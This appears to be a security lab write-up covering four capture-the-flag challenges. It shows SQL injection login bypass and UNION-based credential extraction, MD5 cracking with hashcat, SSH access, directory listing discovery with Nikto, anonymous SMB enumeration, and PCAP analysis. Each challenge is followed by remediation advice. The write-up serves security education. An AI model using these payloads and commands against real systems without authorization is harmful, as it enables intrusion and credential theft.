# 🛡️ Network and Application Security Assessment Lab

A comprehensive security assessment covering authentication weaknesses, web server misconfiguration, SMB share exposure, and network traffic analysis. All activities were conducted in a controlled lab environment using Kali Linux.

⚙️ Environment

Attacker OS: Kali Linux

Target Network: `10.5.5.0/24`

🛠️ Tools Used

Nmap

Nikto

Hashcat

SMBClient

Wireshark

Web Browser

## 🔐 Challenge 1: Exploiting Weak Authentication

## 🎯 Objective

Exploit a vulnerable authentication mechanism to retrieve user credentials and gain system access.

## 🔍 Steps

## Step 1: Identify SQL Injection Vulnerability

A SQL injection vulnerability was discovered in the login form using the classic bypass payload:

text
```bash
' OR '1'='1`
```

This payload successfully bypassed authentication and returned user records from the database.

## Step 2: Extract User Credentials

Using a UNION-based SQL injection, the users table was queried to extract stored credentials:

text
```bash
' UNION SELECT user, password FROM users-- -`
```

The query exposed usernames and their corresponding MD5 password hashes.

## Step 3: Crack Password Hashes

Command:

bash
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt`
```

Result:

```bash
5f4dcc3b5aa765d61d8327deb882cf99 → password'
```

## Step 4: Gain SSH Access

Command:

bash
```bash
ssh smithy@192.168.0.10`
```

Credentials Used:

```bash
Username: smithy

Password: password
```
Successfully authenticated via SSH.

## Step 5: Post-Exploitation

```bash
ls
```
```bash
File Found: my_passwords.txt
```

## ✅ Challenge 1: COMPLETED

## 🔧 Security Remediation

Use Parameterized Queries: Implement prepared statements to prevent SQL injection

Strong Password Hashing: Replace MD5 with bcrypt or Argon2 with proper salting

Multi-Factor Authentication: Implement 2FA for sensitive accounts

Input Validation: Sanitize and validate all user inputs

Account Lockout Policies: Prevent brute-force attacks

## 🌐 Challenge 2: Web Server Vulnerabilities

## 🎯 Objective

Identify and exploit directory listing vulnerabilities to access sensitive files.

## 📋 Attack Methodology

## Step 1: Initial Access

```bash
Target URL: http://10.5.5.12
```
```bash
Credentials: admin / password
```
```bash
Security Level: Low (configured)
```

## Step 2: Vulnerability Scanning

```bash
nikto -h http://10.5.5.12
```
Vulnerabilities Identified:

`Directory listing enabled on /config/`

`Directory listing enabled on /docs/`

## Step 3: Directory Enumeration

Manual Access:

```bash
http://10.5.5.12/config/

http://10.5.5.12/docs/
```

Flag Discovery:

`Location: /config/flag.txt`

```bash
Flag: aWe-4975
```

## ✅ Challenge 2: COMPLETED

## 🔧 Security Remediation

Disable Directory Listing: Configure web server with Options -Indexes

Access Controls: Implement authentication for sensitive directories

Web Server Hardening: Follow security best practices for Apache/Nginx

Regular Audits: Conduct periodic vulnerability scans

## 📂 Challenge 3: Exploiting Open SMB Server Shares

## 🎯 Objective

Discover SMB servers and enumerate accessible shares without authentication.

## 📋 Attack Methodology

## Step 1: Network Discovery

```bash
nmap -sS -sV -p 139,445 10.5.5.0/24
```

Identified Target:

```bash
IP: 10.5.5.14
gravemind.pc
```

Service: SMB

## Step 2: Share Enumeration

```bash
smbclient -L //10.5.5.14 -N
```
## Available Shares:

Share	Anonymous Access	Risk Level

homes	❌ No	Low

workfiles	✅ Yes	High

print$	✅ Yes	Medium

IPC$	✅ Yes	High

Step 3: Share Investigation

```bash
smbclient //10.5.5.14/workfiles -N
smbclient //10.5.5.14/print$ -N
smbclient //10.5.5.14/IPC$ -N
No sensitive flag files found in accessible shares.
```

## ✅ Challenge 3: COMPLETED

## 🔧 Security Remediation

Disable Anonymous Access: Configure SMB to require authentication

Firewall Rules: Restrict SMB ports (139, 445) to trusted networks

Share Permissions: Apply principle of least privilege

SMB Signing: Enable to prevent man-in-the-middle attacks

Regular Auditing: Monitor SMB access logs

## 📡 Challenge 4: PCAP Analysis

## 🎯 Objective

Analyze network traffic to identify clear-text information transmission.

## 📋 Attack Methodology

## Step 1: Traffic Analysis

File: ~/Downloads/SA.pcap

Tool: Wireshark

Filter: http.request.method == "GET"

Key Findings:

Target IP: 10.5.5.11

Exposed Directories:

/config/

/docs/

Protocol: HTTP (unencrypted)

## Step 2: Information Extraction

Direct URL Access:

http://10.5.5.11/config/flag.txt

Flag Content:

Challenge 4 Flag

```bash
Code: SA-3110
```

## ✅ Challenge 4: COMPLETED

## 🔧 Security Remediation

Enforce HTTPS: Redirect all HTTP traffic to HTTPS

HSTS Implementation: Use HTTP Strict Transport Security headers

VPN for Internal Traffic: Encrypt internal network communications

Network Segmentation: Isolate sensitive services

`Traffic Monitoring: Implement IDS/IPS systems`

## 📊 Final Results Summary

## Challenge	Status	Flag Code	Category

Challenge 1	✅ Completed	—	Authentication

Challenge 2	✅ Completed	aWe-4975	Web Security

Challenge 3	✅ Completed	—	Network Services

Challenge 4	✅ Completed	SA-3110	Traffic Analysis

## 🔍 Key Security Findings

## 🔴 Critical Issues

SQL Injection in Authentication: Complete system compromise possible

Directory Listing Enabled: Sensitive file exposure

Anonymous SMB Access: Network share enumeration without credentials

Clear-Text HTTP: Sensitive data transmitted unencrypted

## 🟡 Medium Issues

Weak Password Storage: MD5 hashing without salting

Default Credentials: Admin access with weak passwords

Unnecessary Services: SMB exposed without business need

## 🟢 Recommendations

Implement Web Application Firewall (WAF)

Conduct Regular Penetration Testing

Employee Security Awareness Training

Implement Security Monitoring (SIEM)

Regular Patch Management

## 🚨 Disclaimer
Important: This assessment was performed in a controlled lab environment with explicit authorization. All techniques documented are for educational purposes only. 

Unauthorized testing against systems you do not own or have explicit permission to test is illegal and unethical.

## 📚 References

OWASP Top 10

NIST Cybersecurity Framework

MITRE ATT&CK Framework

SANS Critical Security Controls

## 📧 Contact

For questions about this assessment or security consulting services, please contact through appropriate channels.

📌Disclaimer: This lab demonstrates real-world risks associated with weak authentication mechanisms, poor input validation, and the use of weak, unsalted password hashes.

